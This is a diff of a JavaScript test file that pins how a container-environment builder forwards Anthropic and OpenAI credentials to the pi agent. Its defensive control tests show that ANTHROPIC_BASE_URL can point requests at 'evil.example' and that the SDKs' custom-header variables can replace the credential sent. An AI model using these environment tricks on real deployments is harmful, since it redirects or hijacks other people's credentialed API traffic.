@@ -61,12 +61,16 @@ test("pi's findEnvKeys filters its list by presence, in precedence order", { ski
 	// that exports one -- the very variable this cluster of issues is about, and one `.env.example` offers by
 	// name -- the expectation reads ["ANTHROPIC_OAUTH_TOKEN", "ANTHROPIC_API_KEY"] and the test that pins
 	// pi's presence filter becomes the one test in the file decided by the shell.
-	const restore = withoutEnv(["ANTHROPIC_OAUTH_TOKEN"]);
+	// ANTHROPIC_AUTH_TOKEN is controlled too since the pi 0.99.1 bump (issue #509), where it became the first
+	// name in anthropic's list: a box exporting it would otherwise decide these assertions the same way.
+	const restore = withoutEnv(["ANTHROPIC_OAUTH_TOKEN", "ANTHROPIC_AUTH_TOKEN"]);
 	try {
 		assert.deepEqual(findEnvKeys("anthropic", HOST), ["ANTHROPIC_API_KEY"]);
 		assert.deepEqual(findEnvKeys("openai", HOST), ["OPENAI_API_KEY"]);
 		// OAuth outranks API key -- the array order is the precedence.
 		assert.deepEqual(findEnvKeys("anthropic", { ...HOST, ANTHROPIC_OAUTH_TOKEN: "oauth" }), ["ANTHROPIC_OAUTH_TOKEN", "ANTHROPIC_API_KEY"]);
+		// And the bearer token outranks both (pi 0.99.1).
+		assert.deepEqual(findEnvKeys("anthropic", { ...HOST, ANTHROPIC_OAUTH_TOKEN: "oauth", ANTHROPIC_AUTH_TOKEN: "bearer" }), ["ANTHROPIC_AUTH_TOKEN", "ANTHROPIC_OAUTH_TOKEN", "ANTHROPIC_API_KEY"]);
 	} finally {
 		restore();
 	}
@@ -88,8 +92,9 @@ test("pi's findEnvKeys returns ONE undefined for two different facts, which is w
 
 test("providerKeyCandidates recovers pi's OWN list, present or not", { skip }, () => {
 	// The list `findEnvKeys` filters, before it filters -- which is what doctor needs to NAME the
-	// variable an operator should set. Order is pi's precedence, OAuth first.
-	assert.deepEqual(providerKeyCandidates("anthropic"), ["ANTHROPIC_OAUTH_TOKEN", "ANTHROPIC_API_KEY"]);
+	// variable an operator should set. Order is pi's precedence: at the 0.99.1 pin the bearer token first,
+	// then the OAuth token, then the API key (issue #509).
+	assert.deepEqual(providerKeyCandidates("anthropic"), ["ANTHROPIC_AUTH_TOKEN", "ANTHROPIC_OAUTH_TOKEN", "ANTHROPIC_API_KEY"]);
 	assert.deepEqual(providerKeyCandidates("openai"), ["OPENAI_API_KEY"]);
 	// The drift issue #286 reports: GOOGLE_API_KEY is not a name pi reads for google, or for anything.
 	assert.deepEqual(providerKeyCandidates("google"), ["GEMINI_API_KEY"]);
@@ -104,7 +109,7 @@ test("providerKeyCandidates is hermetic: the real process.env cannot reach it", 
 	// ANTHROPIC_OAUTH_TOKEN -- any operator with a pi subscription login -- would otherwise make the
 	// leak assertion below read ["ANTHROPIC_OAUTH_TOKEN", "ANTHROPIC_API_KEY"], so the test written to
 	// prove hermeticity would be the one non-hermetic test in the file.
-	const saved = Object.fromEntries(["ANTHROPIC_API_KEY", "ANTHROPIC_OAUTH_TOKEN"].map((n) => [n, Object.hasOwn(process.env, n) ? process.env[n] : undefined]));
+	const saved = Object.fromEntries(["ANTHROPIC_API_KEY", "ANTHROPIC_OAUTH_TOKEN", "ANTHROPIC_AUTH_TOKEN"].map((n) => [n, Object.hasOwn(process.env, n) ? process.env[n] : undefined]));
 	const restore = () => {
 		for (const [n, v] of Object.entries(saved)) {
 			if (v === undefined) delete process.env[n];
@@ -113,6 +118,7 @@ test("providerKeyCandidates is hermetic: the real process.env cannot reach it", 
 	};
 	try {
 		delete process.env.ANTHROPIC_OAUTH_TOKEN;
+		delete process.env.ANTHROPIC_AUTH_TOKEN;
 		process.env.ANTHROPIC_API_KEY = "leaked-from-the-shell";
 		assert.deepEqual(providerKeyCandidates("anthropic"), before, "the candidate list ignores the host");
 		// The other direction, asserted positively: pi's own findEnvKeys DOES see it, through an env that
@@ -130,12 +136,27 @@ test("a provider id that is a prototype key yields no candidate, not a coerced o
 	for (const id of ["__proto__", "constructor", "toString"]) assert.deepEqual(providerKeyCandidates(id), [], id);
 });
 
-test("pi's catalog is NOT a superset of the ids findEnvKeys answers for", { skip }, () => {
+test("pi's catalog covers every id findEnvKeys answers for at the 0.99.1 pin, and the question order stays anyway", { skip }, async () => {
 	// The pin for the QUESTION ORDER in doctor's provider check: candidates first, catalog second.
-	// `radius` is purely dynamic -- a real key variable and no catalog entry -- so asking the catalog
-	// first would report a working configuration as an unknown provider.
-	assert.deepEqual(providerKeyCandidates("radius"), ["PI_GATEWAY_API_KEY"]);
-	assert.equal(piProviders().includes("radius"), false);
+	// At 0.80.7 `radius` was purely dynamic -- a real key variable and no catalog entry -- so asking the
+	// catalog first would have reported a working configuration as an unknown provider. At the 0.99.1 pin
+	// (issue #509) radius is a builtin provider (pi-ai/dist/providers/all.js) and its variable is
+	// RADIUS_API_KEY (it was PI_GATEWAY_API_KEY), so the catalog IS now a superset. Pinned in that direction,
+	// so the order is known to be defence in depth today rather than load-bearing, and so the day pi adds a
+	// key variable for an id with no catalog entry this names it.
+	assert.deepEqual(providerKeyCandidates("radius"), ["RADIUS_API_KEY"]);
+	assert.equal(piProviders().includes("radius"), true);
+	// The ids pi's key table answers for, read off the pinned artifact rather than a list here: the
+	// envMap entries plus the two ids answered before it (anthropic, github-copilot).
+	const { readFileSync } = await import("node:fs");
+	const { dirname, join } = await import("node:path");
+	const { fileURLToPath } = await import("node:url");
+	const src = readFileSync(join(dirname(fileURLToPath(import.meta.resolve("@earendil-works/pi-ai"))), "env-api-keys.js"), "utf8");
+	const keyed = [...src.matchAll(/^\s+"?([a-z0-9-]+)"?: "[A-Z0-9_]+",$/gm)].map((m) => m[1]).concat(["anthropic", "github-copilot"]);
+	assert.ok(keyed.length > 30, `read only ${keyed.length} ids off pi's key table, so the scan is reading the wrong thing`);
+	for (const id of keyed) assert.ok(providerKeyCandidates(id).length > 0, `${id}: the scan found an id pi reads no key for`);
+	const catalog = new Set(piProviders());
+	assert.deepEqual(keyed.filter((id) => !catalog.has(id)), [], "an id with a key variable and no catalog entry: the candidates-first order is load-bearing again");
 });
 
 test("an empty candidate list means two different things, and piProviders tells them apart", { skip }, () => {
@@ -325,6 +346,24 @@ test("PI_AUTH_FROM_PI injects the api key from auth.json under pi's expected var
 	assert.equal(env.ANTHROPIC_API_KEY, "sk-from-pi", "pi's own findEnvKeys resolves the var name -- no hand table");
 });
 
+test("a host ANTHROPIC_AUTH_TOKEN is forwarded exactly like a host ANTHROPIC_OAUTH_TOKEN, and auth.json is not consulted (#509)", { skip }, () => {
+	// The rule chosen at the pi 0.99.1 bump: the bearer token pi now reads first is treated the way the
+	// OAuth token always was. It reaches the container under its own name beside the API key (pi then
+	// picks it by its own precedence), doctor warns that it outranks ANTHROPIC_API_KEY, and the auth.json
+	// fallback does not fire because the env already holds a credential.
+	const readFile = () => {
+		throw new Error("auth.json must not be read while the env holds a credential");
+	};
+	const env = buildContainerEnv({ ...authBase, hostEnv: { HOME: "/root", ANTHROPIC_AUTH_TOKEN: "gateway-token", ANTHROPIC_API_KEY: "sk-real" }, authFromPi: true, readFile });
+	assert.equal(env.ANTHROPIC_AUTH_TOKEN, "gateway-token");
+	assert.equal(env.ANTHROPIC_API_KEY, "sk-real");
+	const oauth = buildContainerEnv({ ...authBase, hostEnv: { HOME: "/root", ANTHROPIC_OAUTH_TOKEN: "oauth", ANTHROPIC_API_KEY: "sk-real" }, authFromPi: true, readFile });
+	assert.equal(oauth.ANTHROPIC_OAUTH_TOKEN, "oauth", "the same treatment the OAuth token gets");
+	const alone = buildContainerEnv({ ...authBase, hostEnv: { HOME: "/root", ANTHROPIC_AUTH_TOKEN: "gateway-token" }, authFromPi: true, readFile });
+	assert.equal(alone.ANTHROPIC_AUTH_TOKEN, "gateway-token");
+	assert.equal(alone.ANTHROPIC_API_KEY, undefined, "nothing is invented beside it");
+});
+
 test("PI_AUTH_FROM_PI: the env wins when the key is present (fallback only, auth.json never read)", { skip }, () => {
 	const env = buildContainerEnv({
 		...authBase,
@@ -432,17 +471,21 @@ test("PI_AUTH_FROM_PI resolves huggingface, whose variable shares no stem with i
 	assert.equal(env.HF_TOKEN, "hf-token");
 });
 
-test("an auth.json api key is NEVER injected under the OAuth token variable, host env or not", { skip }, () => {
+test("an auth.json api key is NEVER injected under the OAuth or bearer token variable, host env or not", { skip }, () => {
 	// Two properties in one test, because they are the same line of code.
-	// pi's precedence for anthropic is [ANTHROPIC_OAUTH_TOKEN, ANTHROPIC_API_KEY], so taking pi's first
-	// candidate would write an api_key credential under the subscription-login name -- the variable doctor
-	// refuses to name, for the same reason.
+	// pi's precedence for anthropic is [ANTHROPIC_AUTH_TOKEN, ANTHROPIC_OAUTH_TOKEN, ANTHROPIC_API_KEY] at the
+	// 0.99.1 pin, so taking pi's first candidate would write an api_key credential under the bearer name (pi
+	// then sends it as `Authorization: Bearer`, issue #509), and skipping only that one would land it on the
+	// subscription-login name -- the variables doctor refuses to name, for the same reason.
 	// And the old resolver's synthetic environment was a plain object, while pi's getProviderEnvValue falls
 	// back to the REAL process.env: with ANTHROPIC_OAUTH_TOKEN exported here, it resolved to that name. The
 	// candidate list is now asked against a proxy where every name is present, so the host cannot reach in.
 	const had = Object.hasOwn(process.env, "ANTHROPIC_OAUTH_TOKEN");
 	const before = process.env.ANTHROPIC_OAUTH_TOKEN;
+	const hadBearer = Object.hasOwn(process.env, "ANTHROPIC_AUTH_TOKEN");
+	const beforeBearer = process.env.ANTHROPIC_AUTH_TOKEN;
 	process.env.ANTHROPIC_OAUTH_TOKEN = "oauth-on-this-host";
+	process.env.ANTHROPIC_AUTH_TOKEN = "bearer-on-this-host";
 	try {
 		const env = buildContainerEnv({
 			...authBase,
@@ -452,9 +495,12 @@ test("an auth.json api key is NEVER injected under the OAuth token variable, hos
 		});
 		assert.equal(env.ANTHROPIC_API_KEY, "sk-from-pi");
 		assert.equal(env.ANTHROPIC_OAUTH_TOKEN, undefined, "the api key must not ride the OAuth variable");
+		assert.equal(env.ANTHROPIC_AUTH_TOKEN, undefined, "the api key must not ride the bearer variable");
 	} finally {
 		if (had) process.env.ANTHROPIC_OAUTH_TOKEN = before;
 		else delete process.env.ANTHROPIC_OAUTH_TOKEN;
+		if (hadBearer) process.env.ANTHROPIC_AUTH_TOKEN = beforeBearer;
+		else delete process.env.ANTHROPIC_AUTH_TOKEN;
 	}
 });
 
@@ -594,6 +640,7 @@ test("the write path goes through the shared selection, and never lands on an OA
 		assert.equal(env[expected], `sk-${id}`, `${id}: injected under ${expected}`);
 		assert.ok(candidates.includes(expected), `${id}: ${expected} is a name pi reads`);
 		assert.ok(!/_OAUTH_TOKEN$/.test(expected), `${id}: ${expected} is not a subscription login`);
+		assert.ok(!/_AUTH_TOKEN$/.test(expected), `${id}: ${expected} is not a bearer token (issue #509)`);
 		assert.equal(Object.keys(env).filter((k) => env[k] === `sk-${id}`).length, 1, `${id}: the key lands in exactly one variable`);
 	}
 	assert.equal(multiCandidate, 1, "anthropic is still the only provider whose choice is a real choice");
@@ -966,24 +1013,88 @@ test("pi pins the Anthropic endpoint and auth token, so the environment cannot m
 	assert.equal(request.headers["x-api-key"], "sk-ant-not-a-real-key", "the key pi was GIVEN is the one it sends");
 });
 
-test("the control: with no model baseUrl the environment DOES win, which is why the names are reserved", { skip }, async () => {
-	// Without this, the pin above would pass against a stub that never fired, or against a pi that had
-	// stopped reading the environment for unrelated reasons. `model.baseUrl` is what makes the anthropic
-	// path inert, and this shows what happens without one.
-	//
-	// AND THE HONEST BOUND ON WHAT THAT PROVES, because the first draft of this comment asserted a
-	// deployment that does not exist: a custom model in the operator's global overlay CANNOT reach `stream`
-	// without a baseUrl. `pi-coding-agent`'s ModelRegistry fills it from the provider config and then the
-	// built-in default (`model-registry.js:492`) and SKIPS the model entirely if all three are absent, and
-	// the schema forbids an empty string. So this is a property of `stream`, not a reachable path, and
-	// reserving `ANTHROPIC_BASE_URL` is defence in depth against a pi that stops passing `baseURL` rather
-	// than a hole that is open today. The azure and google cases are the ones that are open today.
+test("the SDKs' custom-header variables reach pi's real request and REPLACE the credential it sends (0.99.1, #509)", { skip }, async () => {
+	// New at the 0.99.1 pin, measured, and the reason both names joined provider-steering.mjs: the Anthropic
+	// SDK (0.124.0) folds ANTHROPIC_CUSTOM_HEADERS, and openai (7.19.0) OPENAI_CUSTOM_HEADERS, into every
+	// client's headers, and a line naming the credential header wins over the key pi was GIVEN. So a job
+	// env carrying either one decides which credential the provider call spends, with no baseUrl involved.
+	// If a pi or SDK release stops honouring them, this goes red and the reservation can be revisited.
 	const { ANTHROPIC_MODELS } = await import("@earendil-works/pi-ai/providers/anthropic.models");
-	const custom = { ...(ANTHROPIC_MODELS["claude-haiku-4-5"] ?? Object.values(ANTHROPIC_MODELS)[0]), baseUrl: undefined };
+	const anthropicModel = ANTHROPIC_MODELS["claude-haiku-4-5"] ?? Object.values(ANTHROPIC_MODELS)[0];
+	const anthropic = await withEnv({ ANTHROPIC_CUSTOM_HEADERS: "x-api-key: sk-ant-chosen-by-the-env" }, () => anthropicRequestFor(anthropicModel));
+	assert.ok(anthropic, "the stub captured no Anthropic request, so this asserted nothing");
+	assert.equal(anthropic.headers["x-api-key"], "sk-ant-chosen-by-the-env", "ANTHROPIC_CUSTOM_HEADERS replaces the key pi sends");
 
-	const request = await withEnv({ ANTHROPIC_BASE_URL: "https://evil.example/v1" }, () => anthropicRequestFor(custom));
-	assert.ok(request, "the stub captured no request, so the control proves nothing");
-	assert.match(request.url, /^https:\/\/evil\.example\//, "a model with no baseUrl lets ANTHROPIC_BASE_URL choose the host");
+	const { OPENAI_MODELS } = await import("@earendil-works/pi-ai/providers/openai.models");
+	const openaiModel = OPENAI_MODELS["gpt-5.4"] ?? Object.values(OPENAI_MODELS)[0];
+	assert.equal(openaiModel?.api, "openai-responses", "the openai model this pin drives moved to another api; re-point it");
+	const captured = [];
+	const realFetch = globalThis.fetch;
+	globalThis.fetch = async (url, opts) => {
+		captured.push({ url: String(url), headers: Object.fromEntries(new Headers(opts?.headers ?? {})) });
+		throw new Error("pinned: the request was captured, not sent");
+	};
+	try {
+		await withEnv({ OPENAI_CUSTOM_HEADERS: "Authorization: Bearer sk-chosen-by-the-env" }, async () => {
+			const { stream } = await import("@earendil-works/pi-ai/api/openai-responses");
+			try {
+				await stream(openaiModel, { messages: [{ role: "user", content: "hi" }] }, { apiKey: "sk-not-a-real-key" }).result();
+			} catch {}
+		});
+	} finally {
+		globalThis.fetch = realFetch;
+	}
+	assert.ok(captured[0], "the stub captured no OpenAI request, so this asserted nothing");
+	assert.equal(captured[0].headers.authorization, "Bearer sk-chosen-by-the-env", "OPENAI_CUSTOM_HEADERS replaces the key pi sends");
+});
+
+test("the control: an Anthropic client built WITHOUT pi's baseURL lets the environment win, which is why the names are reserved", { skip }, async () => {
+	// Without this, the pin above would pass against a stub that never fired, or against a pi that had
+	// stopped reading the environment for unrelated reasons.
+	//
+	// RE-DERIVED at the pi 0.99.1 bump (issue #509). At 0.80.7 the control drove pi's own `stream` with a
+	// model whose baseUrl was undefined, and pi handed the SDK `baseURL: undefined`, so the SDK's
+	// `readEnv('ANTHROPIC_BASE_URL')` default fired. At 0.99.1 that model never reaches fetch at all:
+	// `getAnthropicCompat` reads `model.baseUrl.includes(...)` before any client is built and throws a
+	// TypeError (anthropic-messages.js:136, measured). The first assertion below pins that, so the day a pi
+	// release makes a baseUrl-less model reach the client again, this control says so.
+	//
+	// The control itself now builds the client pi builds, from the SAME SDK copy pi imports (resolved through
+	// pi-ai, not from here), with every option pi's API-key branch passes EXCEPT `baseURL`. That isolates the
+	// one fact the pin above depends on: the endpoint stays put only because pi passes baseURL explicitly.
+	// The honest bound from the old version still holds: no reachable deployment builds a model without a
+	// baseUrl (pi's model registry fills one or skips the model), so reserving ANTHROPIC_BASE_URL is defence
+	// in depth against a pi that stops passing it, not a hole open today.
+	const { ANTHROPIC_MODELS } = await import("@earendil-works/pi-ai/providers/anthropic.models");
+	const model = ANTHROPIC_MODELS["claude-haiku-4-5"] ?? Object.values(ANTHROPIC_MODELS)[0];
+	const { stream } = await import("@earendil-works/pi-ai/api/anthropic-messages");
+	assert.throws(
+		() => stream({ ...model, baseUrl: undefined }, { messages: [{ role: "user", content: "hi" }] }, { apiKey: "sk-ant-not-a-real-key" }),
+		TypeError,
+		"a model with no baseUrl now fails before any client is built; if that changed, the 0.80.7 control shape is live again and belongs back here",
+	);
+
+	const { createRequire } = await import("node:module");
+	const { pathToFileURL, fileURLToPath } = await import("node:url");
+	const piRequire = createRequire(fileURLToPath(import.meta.resolve("@earendil-works/pi-ai")));
+	const sdk = await import(pathToFileURL(piRequire.resolve("@anthropic-ai/sdk")).href);
+	const Anthropic = sdk.default?.default ?? sdk.default ?? sdk.Anthropic;
+	const captured = [];
+	const fetch = async (url, opts) => {
+		captured.push({ url: String(url), headers: Object.fromEntries(new Headers(opts?.headers ?? {})) });
+		throw new Error("pinned: the request was captured, not sent");
+	};
+	await withEnv({ ANTHROPIC_BASE_URL: "https://evil.example/v1" }, async () => {
+		// pi's API-key branch (createClient in anthropic-messages.js) minus `baseURL: model.baseUrl`.
+		const client = new Anthropic({ apiKey: "sk-ant-not-a-real-key", authToken: null, dangerouslyAllowBrowser: true, fetch, maxRetries: 0 });
+		try {
+			await client.messages.create({ model: model.id, max_tokens: 1, messages: [{ role: "user", content: "hi" }] });
+		} catch {
+			// Expected: the stub refuses every request.
+		}
+	});
+	assert.ok(captured[0], "the stub captured no request, so the control proves nothing");
+	assert.match(captured[0].url, /^https:\/\/evil\.example\//, "without pi's explicit baseURL, ANTHROPIC_BASE_URL chooses the host");
 });
 
 test("HOME is written only when a home is passed, and neither a forwarded nor a secret HOME can win (issue #341)", { skip }, () => {
